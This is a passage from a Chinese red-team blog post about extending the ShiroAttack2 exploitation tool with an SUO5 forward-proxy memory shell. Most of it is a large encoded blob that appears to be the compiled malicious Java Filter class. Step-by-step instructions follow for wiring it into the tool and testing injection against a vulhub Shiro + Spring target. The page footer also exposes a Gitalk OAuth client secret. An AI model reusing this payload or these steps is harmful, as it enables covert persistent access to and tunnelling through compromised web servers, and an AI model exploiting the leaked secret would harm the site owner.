AAXQGhAGYBogBuAaQAdgGlAH4BpgCIAacAlAGmAJoBqQChAaoBMAAAAFwACQAxACQB4wE7AAUAJgAvATkBIQAEAIEAGQFLAUwABgAAAKcBMQEyAAAAAACnAVkBJQABAAgAnwHkAeUAAgBdAEoBTQE7AAMAZgBBAeYB5wAEAHYAMQE5AdYABQHLAAAADAABAAAApwFZAcwAAQFGAAAAKQAE%2FQASBwHoBwHp%2BgBF%2FwAoAAcHAWkHAeoHAegHACQHAesBAQAA%2BgAYATwAAAAEAAEA0wEmAAAAAgHsAAIB7QHuAAMBLgAAAyIABAAPAAABPLsAzFkrtwDNTQi8CE4sLbYAzi24AM86BBkEtgDQNgUZBLYA0TYGFQUS0qQADbsA01kS1LcA1b8VBbwIOgcsGQe2AM4DNggVCBkHvqIAFxkHFQgZBxUIMxUGgpFUhAgBp%2F%2FnuwC2WbcAtzoIAzYKFQoZB74EZKIAxBkHFQozkzYLhAoBFQoVC2AZB76hAA27ADtZEta3ANe%2FFQucAA27ADtZEta3ANe%2FGQcVChUKFQtguADYOgm7ACpZGQm3AC86DBUKFQtgNgoVCgdgGQe%2BoQANuwA7WRLZtwDXvxkHFQoVCgdguADYOgkqGQm2ANo2DYQKBBUNnAANuwA7WRLbtwDXvxUKFQ1gGQe%2BpAANuwA7WRLbtwDXvxkHFQoVChUNYLgA2DoOFQoVDWA2ChkIGQwZDrYAuVen%2FzgZCLAAAAAEAS8AAACaACYAAAGuAAkBrwANAbAAEgGyABgBswAfAbQAJgG1AC0BtgA3AbgAPQG5AEMBugBOAbsAXAG6AGIBvQBrAb8AeAHAAIABwQCDAcIAjgHDAJgBxQCdAcYApwHIALUByQDAAcoAxwHMANEBzQDbAc8A6AHQAPAB0QDzAdIA%2BAHTAQIB1gENAdcBFwHZASUB2gEsAdwBNgHdATkB3gEwAAAAogAQAEYAHAFLAUwACACAALYB7wHwAAsAwAB2ATkBIQAMAPAARgHxAUwADQElABEB4wE7AA4AtQCEAeQBOwAJAG4AywFLAUwACgAAATwBMQEyAAAAAAE8ATQBKQABAAkBMwHyAfMAAgANAS8B9AE7AAMAGAEkAfUB5wAEAB8BHQH2AUwABQAmARYB9wFMAAYAPQD%2FAfgBOwAHAGsA0QFZASUACAHLAAAADAABAGsA0QFZAcwACAFGAAAAegAK%2FwA3AAcHAWkHAfkHAfoHACQHAesBAQAA%2FQAOBwAkAfoAG%2F4ACwcB6gAB%2FAApAQ7%2FADMADQcBaQcB%2BQcB%2BgcAJAcB6wEBBwAkBwHqBwAkAQEHAV0AAPwAJgEU%2FwAhAAkHAWkHAfkHAfoHACQHAesBAQcAJAcB6gAAATwAAAAEAAEAOwEmAAAAAgH7AAIB%2FAHTAAIBLgAAA5IABQAQAAABUSu5ALMBAE67ANxZLbcA3ToEKhkEtwDeOgUZBRK4tgDCwAAkOgYZBr4EoAAKGQYDM5kADSwRAZO5AIkCALEsESAAuQDfAgAsuQC1AQA6BywS4BLhuQCMAwC7ACpZGQUS4rYAwsAAJLcALzoIuwAqWRkFEuO2AMLAACS3AC%2B4AOQ2CbsA5Vm3AOY6ChkKuwDnWRkIFQm3AOgRE4i2AOmnAB46CxkHKioEtwDqtwCutgCvGQe2ALAZB7YAsbEZByoqA7cA6rcArrYArxkHtgCwGQq2AOs6CxkKtgDsOgwBOg27AO1ZGQwZB7cA7joOuwDvWRkOwADwtwDxOg0ZDbYA8ioZBBkLtwDzGQq2APQZB7YAsRkNxgA9GQ22APWnADU6DhkKtgD0GQe2ALEZDcYAJBkNtgD1pwAcOg8ZCrYA9BkHtgCxGQ3GAAgZDbYA9RkPv7EABQCBAJ0AoAA7AN8BBwEeADsA3wEHATcAAAEeASABNwAAATcBOQE3AAAABAEvAAAAsgAsAAAB4gAHAeMAEQHlABkB5wAlAegAMwHpADwB6gA9AewARgHtAE4B8ABYAfEAawHyAIEB9QCKAfYAnQH8AKAB9wCiAfgAsAH5ALUB%2BgC6AfsAuwH%2BAMkB%2FwDOAgEA1QICANwCBADfAgYA7AIHAPoCCAD%2FAgkBBwINAQwCDgERAg8BFgIQAR4CCgEgAg0BJQIOASoCDwEvAhABNwINAT4CDgFDAg8BSAIQAU0CEgFQAhMBMAAAAKwAEQCKABYB%2FQH%2BAAoAogAZAWEBYgALAOwAGwH%2FATIADgAAAVEBMQEyAAAAAAFRARwBHQABAAABUQFyAR8AAgAHAUoCAAEpAAMAEQFAAgECAgAEABkBOAHBASUABQAlASwCAwE7AAYATgEDAgQBKwAHAGsA5gIFASEACACBANACBgFMAAkAuwCWAf0B%2FgAKANUAfAIHASsACwDcAHUCCAEpAAwA3wByAgkCCgANAcsAAAAMAAEAGQE4AcEBzAAFAUYAAACLAAj%2FADMABwcBaQcBrwcBsAcB%2BQcCCwcB6gcAJAAACf8AYgAKBwFpBwGvBwGwBwH5BwILBwHqBwAkBwIMBwFdAQABBwFe%2FAAaBwIN%2FwBiAA4HAWkHAa8HAbAHAfkHAgsHAeoHACQHAgwHAV0BBwINBwIMBwH5BwIOAAEHAV5YBwGc%2FQAVAAcBnPkAAgE8AAAABAABADsAAgIPAhAAAgEuAAAA6gAEAAcAAABBESAAvAg6BCsZBLYA9jYFFQWdAAanACwZBAMDFQVguADYOgYdmQAPKioZBrcA97cArjoGLBkGtgCvLLYAsKf%2FyrEAAAADAS8AAAAuAAsAAAIWAAcCGQAPAhoAFAIbABcCHQAjAh4AJwIfADMCIQA5AiIAPQIjAEACJAEwAAAASAAHAA8ALgIRAUwABQAjABoCEgE7AAYAAABBATEBMgAAAAAAQQITASkAAQAAAEECFAErAAIAAABBAhUCFgADAAcAOgIXATsABAFGAAAAFQAE%2FAAHBwAk%2FAAPAfwAGwcAJPkADAE8AAAABAABANMAAgIYAhkAAgEuAAABHgACAAYAAABbKiu3AN5OLRK4tgDCwAAkOgQZBL4EnwAEsRkEAzMFoAAILLYAsbEZBAMzBKAAIS0Su7YAwsAAJDoFGQW%2BmQANLBkFtgCvLLYAsKcADxkEAzMGoAAGp%2F%2Bssaf%2FqAAAAAQBLwAAAEIAEAAAAikABgIrABECLAAYAi0AGQIvACECMAAlAjEAJgIyAC4CMwA5AjQAPwI1AEUCNgBJAjgAVAI5AFcCOwBYAj0BMAAAAD4ABgA5ABABTQE7AAUABgBSAcEBJQADABEARwIDATsABAAAAFsBMQEyAAAAAABbAhoCAgABAAAAWwIbASsAAgHLAAAADAABAAYAUgHBAcwAAwFGAAAAEwAHAP0AGAcB6gcAJAwiAgr5AAABPAAAAAQAAQA7AAICHAHTAAIBLgAABrIABQAUAAACmyu5ALMBAE4ruQD4AQC5APkBADoEuwDcWS23AN06BSoZBbcA3joGuwAqWRkGEvq2AMLAACS3AC86BxkGEri2AMLAACQ6CBkIvgSfAA0sEQGTuQCJAgCxGQYSHLYAwsAAJDoJGQnGAA0ZCb6eAAcEpwAEAzYKEgg6CxUKmQAmGQYSHLYA%2B1e7ACpZGQm3AC86CyoZC7YA%2FJoABwSnAAQDNgoVCpkAJBkIAzMEoQAcGQgDMwajABQqKxkGGQu2AP06DBkMtgD%2BsSwRIAC5AN8CACy5ALUBADoMGQgDMwWgABwZBBkHuQD%2FAgDAAQA6DRkNxgAIGQ22ALGxGQgDMwSgAFIZBBkHuQD%2FAgDAAQA6DRkNxwAbGQwqKrcBAbcArrYArxkMtgCwGQy2ALGxGQYSu7YAwsAAJDoOGQ6%2BmQAPGQ0ZDrYArxkNtgCwGQy2ALGxGQgDM5kABLEsEuAS4bkAjAMAuwAqWRkGEuK2AMLAACS3AC86DbsAKlkZBhLjtgDCwAAktwAvuADkNg4BOhABOhEVCpkAGCorGQYZC7YA%2FToRGRG2AQI6D6cAbrsA5Vm3AOY6EBkQuwDnWRkNFQ63AOgRE4i2AOkZELYA7DoPGQQZBxkQtgDruQEDAwAZDCoqA7cA6rcArrYArxkMtgCwpwAnOhIZBBkHuQEEAgAZDCoqBLcA6rcArrYArxkMtgCwGQy2ALGxKhkPGQwVCpoABwSnAAQDtwEFGRDGAAgZELYA9BkRxgAIGRG2AP4ZDLYAsRkEGQe5AQQCAKcAUToSGRDGAAgZELYA9BkRxgAIGRG2AP4ZDLYAsRkEGQe5AQQCAKcAKjoTGRDGAAgZELYA9BkRxgAIGRG2AP4ZDLYAsRkEGQe5AQQCABkTv7EABQGqAe4B8QA7AhUCJwJMADsCFQInAnMAAAJMAk4CcwAAAnMCdQJzAAAABAEvAAABXgBXAAACQgAHAkMAFAJEAB4CRgAmAkkAOQJKAEUCSwBMAkwAVQJNAFYCVQBiAlYAdAJXAHgCWAB9AlkAhQJaAJACWwCgAl8AtQJgAMACYQDFAmIAxgJlAM8CZgDXAmcA3wJoAO0CaQDyAmoA9wJsAPgCbQEAAm4BDgJvARMCcAEgAnEBJQJyASoCcwErAnUBNwJ2AT0CdwFEAngBSQJ6AU4CewFPAn8BVgKAAVcCgwFhAoQBdAKFAYoCiAGNAokBkAKLAZUCjQGgAo4BqgKSAbMCkwHGApQBzQKVAdsClgHpApcB7gKeAfECmAHzApkB%2FAKaAgoCmwIPApwCFAKdAhUCogInAqcCLAKoAjECqgI2AqsCOwKtAkACrgJJAq8CTAKjAk4CpwJTAqgCWAKqAl0CqwJiAq0CZwKuAnACrwJzAqcCegKoAn8CqgKEAqsCiQKtAo4CrgKXAq8CmgKwATAAAAD8ABkAwAAGAcYBxwAMAO0ACwIHASsADQEOAEECBwErAA0BNwAYAU0BOwAOAacAAwIdASkADwHNACQCHQEpAA8B8wAiAWEBYgASAAACmwExATIAAAAAApsBHAEdAAEAAAKbAXIBHwACAAcClAG2ASkAAwAUAocBvgGQAAQAHgJ9AfICAgAFACYCdQHBASUABgA5AmICHgEhAAcARQJWAgMBOwAIAGICOQIfATsACQB0AicCIAIWAAoAeAIjAiEBIQALANcBxAIEASsADAF0AScCBQEhAA0BigERAgYBTAAOAhUAhgIdASkADwGNAQ4B%2FQH%2BABABkAELAcYBxwARAcsAAAAMAAEAJgJ1AcEBzAAGAUYAAAFlABv%2FAFYACQcBaQcBrwcBsAcB%2BQcBlQcCCwcB6gcBXQcAJAAA%2FAAaBwAkQAH9ACoBBwFdQAEBJf0AMAcCDAcCDPoAAPwAMgcCDPwAHQcAJPkABQf%2FAFIAEgcBaQcBrwcBsAcB%2BQcBlQcCCwcB6gcBXQcAJAcAJAEHAV0HAgwHAV0BAAcCDQcBzwAA9wBGBwFe%2FwAjABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwAA%2FwANABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwADBwFpBwH5BwIM%2FwAAABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwAEBwFpBwH5BwIMAQwJUAcBXgsJUAcBnP0ACwAHAZwJ%2BQAQATwAAAAEAAEAOwABAiIBLQABAS4AAABdAAQAAgAAABIqKrQACiq0AAsEtwEFpwAETLEAAQAAAA0AEAA7AAMBLwAAABIABAAAArQADQK4ABACtQARArkBMAAAAAwAAQAAABIBMQEyAAABRgAAAAcAAlAHAV4AAAgCIwHaAAIBLgAAAX4AAwAHAAAAdLsAtlm3ALdLuAEGTCu5AKoBAJkAXCu5AKsBAMABB00stgEITi25AKoBAJkAQS25AKsBAMABCToEGQS2AQo6BRkFxgAnGQUQJbYBCzYGFQYCnwANGQUDFQa2ADo6BSoZBQS4AQy2ALlXp%2F%2B8p%2F%2BhpwAETCqwAAEACABuAHEAOwAEAS8AAABKABIAAAK8AAgCvgAMAr8AFQLAAB8CwQAkAsIALQLDADgCxAA%2FAsUARALHAE0CyABTAskAXQLLAGgCzQBrAs4AbgLQAHECzwByAtEBMAAAAEgABwBNABsCJAFMAAYAOAAwAiUCJgAEAD8AKQFbASEABQAfAEwCJwIoAAIAJABHAikByQADAAwAYgIqAckAAQAIAGwBJAElAAABywAAACAAAwAkAEcCKQIrAAMADABiAioCLAABAAgAbAEkAScAAAFGAAAALAAI%2FQAMBwHqBwHQ%2FQAXBwItBwHQ%2FgA4BwIuBwFdAfgACvkAAvoAAkIHAV4AASYAAAACAi8AAAIwAjEAAgEuAAAAVgADAAMAAAAUuwCWWSu3AJe2AQ1NsgEOLLYBD6wAAAACAS8AAAAKAAIAAALVAAwC1gEwAAAAIAADAAAAFAExATIAAAAAABQBlAEhAAEADAAIAjIBIQACATwAAAAEAAEAOwABAjMCNAABAS4AAABAAAEAAwAAAAIErAAAAAIBLwAAAAYAAQAAAvIBMAAAACAAAwAAAAIBMQEyAAAAAAACAjUBIQABAAAAAgI2AjcAAgABAjgCOQACAS4AAAA%2FAAAAAwAAAAGxAAAAAgEvAAAABgABAAAC9gEwAAAAIAADAAAAAQExATIAAAAAAAEBqgI6AAEAAAABAjsBIQACATwAAAAEAAECPAABAj0COQACAS4AAAA%2FAAAAAwAAAAGxAAAAAgEvAAAABgABAAAC%2BQEwAAAAIAADAAAAAQExATIAAAAAAAEBqgI6AAEAAAABAjsBIQACATwAAAAEAAECPAABAj4CPwABAS4AAAAvAAEAAQAAAAUDvQEQsAAAAAIBLwAAAAYAAQAAAvwBMAAAAAwAAQAAAAUBMQEyAAAACQJAAkEAAgEuAAABTQAGAAUAAAB8AUwSFrgAF00sEwERAcABErYAHywBwABWtgAhTi22ACITARMEvQAeWQMSJFO2AB8tBL0AIFkDKlO2ACHAACpMpwA7ThMBFLgAF00stgAmOgQZBLYAIhMBFQS9AB5ZAxIkU7YAHxkEBL0AIFkDKlO2ACHAACpMpwAFOgQrsAACAAIAPwBCADsAQwB1AHgAOwADAS8AAAAyAAwAAAMBAAIDBQAIAwYAHAMHAD8DDwBCAwgAQwMKAEoDCwBQAwwAdQMOAHgDDQB6AxEBMAAAAEgABwAcACMCQgFCAAMACAA6AT0BQAACAFAAJQJCAUIABABKAC4BPQFAAAIAQwA3AkMBYgADAAAAfAH4ATsAAAACAHoB4wEhAAEBRgAAACkAA%2F8AQgACBwAkBwFdAAEHAV7%2FADUABAcAJAcBXQAHAV4AAQcBXvkAAQE8AAAABAABADsAAQJEATcAAgEuAAABAAAGAAUAAAB8EwEWuAAXTSwSLgS9AB5ZAxIqU7YAHyy2ACYEvQAgWQMrU7YAIcAAJMAAJMAAJMAAJLBNEha4ABdOLRMBFwO9AB62AB8BA70AILYAIToEGQS2ACITARgEvQAeWQMSKlO2AB8ZBAS9ACBZAytTtgAhwAAkwAAkwAAkwAAksAABAAAAMQAyADsAAwEvAAAAGgAGAAADFwAHAxgAMgMZADMDGgA5AxsATgMcATAAAAA%2BAAYABwArAW4BQAACADkAQwFuAUAAAwBOAC4CRQFCAAQAMwBJAkYBYgACAAAAfAExATIAAAAAAHwCRwEhAAEBRgAAAAYAAXIHAV4BPAAAAAQAAQA7AAgCSAEtAAEBLgAAAB8AAQAAAAAAB7gBGbMBDrEAAAABAS8AAAAGAAEAAAAkAAICSQAAAAICSgGNAAAACgABAYsDWwGMBgk%3D&quot;);
+复制代码
+</code></pre>
+<ul>
+<li>第四步，将生成的Base64编码，添加到MEM_TOOLS的Map中即可：</li>
+</ul>
+<figure data-type="image" tabindex="6"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852071.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852071.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>第五步，修改 <code>com/summersec/attack/UI/MainController.java</code> 来是我们点击按钮时调用到对应的功能，新增一个就行，名字要与刚才Map的Key对应：</li>
+</ul>
+<figure data-type="image" tabindex="7"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852381.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852381.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>第六步，修改<code>com/summersec/attack/core/AttackService.java</code>的 <code>injectMem</code>方法，对注入的<code>SUO5Filter</code>进行判断和处理：</li>
+</ul>
+<figure data-type="image" tabindex="8"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852574.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852574.png" alt="img" loading="lazy"></a></figure>
+<h2 id="0x03-测试效果">0x03 测试效果</h2>
+<ul>
+<li>就用vulhub 的 Shiro + Spring 环境 注入Filter测试：</li>
+</ul>
+<figure data-type="image" tabindex="9"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021859542.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021859542.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>测试联通性，记得添加Header：</li>
+</ul>
+<figure data-type="image" tabindex="10"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852077.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852077.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>连接成功：</li>
+</ul>
+<figure data-type="image" tabindex="11"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852784.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852784.png" alt="img" loading="lazy"></a></figure>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/-rcF0EfVN/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/-rcF0EfVN/&sharesource=qzone&title=ShiroAttack2：内存马-SUO5正向代理&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/-rcF0EfVN/&sharesource=weibo&title=ShiroAttack2：内存马-SUO5正向代理 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/">
+                                                                                            红队开发: Behinder3-Beta11 实战下的二次开发 （4）
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/LfXdtONwu/">
+                                                                                                    CTF：Java环境xxe结合jar协议缓存实现RCE
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
